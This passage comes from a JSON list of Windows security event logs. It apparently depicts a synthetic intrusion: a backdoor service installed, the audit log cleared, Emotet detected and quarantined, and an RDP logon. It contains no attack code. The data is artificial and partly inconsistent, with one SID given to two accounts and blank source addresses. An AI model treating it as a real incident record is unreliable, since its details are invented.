Security ID: S-1-5-21-123456789-123456789-123456789-1010 Account Name: jsmith Group: Security ID: S-1-5-32-544 Group Name: Administrators Group Domain: Builtin Additional Information: Privileges: SeSecurityPrivilege SeTakeOwnershipPrivilege SeLoadDriverPrivilege SeBackupPrivilege SeRestorePrivilege SeDebugPrivilege SeSystemtimePrivilege SeShutdownPrivilege SeRemoteShutdownPrivilege SeTcbPrivilege SeCreateTokenPrivilege SeCreatePagefilePrivilege SeCreateGlobalPrivilege SeCreatePermanentPrivilege SeCreateSymbolicLinkPrivilege SeEnableDelegationPrivilege SeTrustedCredManAccessPrivilege SeRelabelPrivilege SeIncreaseWorkingSetPrivilege SeTimeZonePrivilege SeCreateTimeZonePrivilege"},{"log":"May 27 10:40:00 host01 Microsoft-Windows-Security-Auditing[4697]: A service was installed in the system. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: admin Account Domain: CONTOSO Logon ID: 0x34567 Service Information: Service Name: MaliciousService Service File Name: C:\\ProgramData\\backdoor.exe Service Type: user mode service Service Start Type: auto start Service Account: LocalSystem"},{"log":"May 27 10:45:00 host01 Microsoft-Windows-Security-Auditing[4634]: An account was logged off. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: jsmith Account Domain: CONTOSO Logon ID: 0x45678 Logon Type: 3"},{"log":"May 27 10:50:00 host01 Microsoft-Windows-Security-Auditing[1102]: The audit log was cleared. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: admin Account Domain: CONTOSO Logon ID: 0x56789"},{"log":"May 27 10:55:00 host01 Microsoft-Windows-Windows Defender[1116]: Windows Defender Antimalware has detected malware or other potentially unwanted software. For more information please see the following: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Emotet.A&threatid=2147685180&enterprise=0 Name: Trojan:Win32/Emotet.A ID: 2147685180 Severity: Severe Category: Trojan Path: C:\\Users\\jsmith\\Downloads\\invoice.exe Detection Origin: User User: CONTOSO\\jsmith Process Name: C:\\Users\\jsmith\\Downloads\\invoice.exe Security intelligence Version: 1.343.658.0 Engine Version: 1.1.18300.4"},{"log":"May 27 11:00:00 host01 Microsoft-Windows-Windows Defender[1117]: Windows Defender Antimalware has taken action to protect your machine from malware or other potentially unwanted software. For more information please see the following: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Emotet.A&threatid=2147685180&enterprise=0 Name: Trojan:Win32/Emotet.A ID: 2147685180 Severity: Severe Category: Trojan Path: C:\\Users\\jsmith\\Downloads\\invoice.exe Detection Origin: User Action: Quarantine User: CONTOSO\\jsmith Process Name: C:\\Users\\jsmith\\Downloads\\invoice.exe Security intelligence Version: 1.343.658.0 Engine Version: 1.1.18300.4"},{"log":"May 27 11:05:00 host01 Microsoft-Windows-TerminalServices-RemoteConnectionManager[1149]: Remote Desktop Services: User authentication succeeded: User: CONTOSO\\jsmith Domain: CONTOSO Source Network Address:"},{"log":"May 27 11:10:00 host01 Microsoft-Windows-Security-Auditing[4624]: An account was successfully logged on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Information: Logon Type: 10 Restricted Admin Mode: - Virtual Account: No Elevated Token: Yes Impersonation Level: Impersonation New Logon: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: jsmith Account Domain: CONTOSO Logon ID: 0x67890 Logon GUID: {12345678-1234-5678-90ab-123456789abc} Process Information: Process ID: 0x1a2b Process Name: C:\\Windows\\System32\\winlogon.exe Network Information: Workstation Name: WIN-WORKSTATION01 Source Network Address:"}]
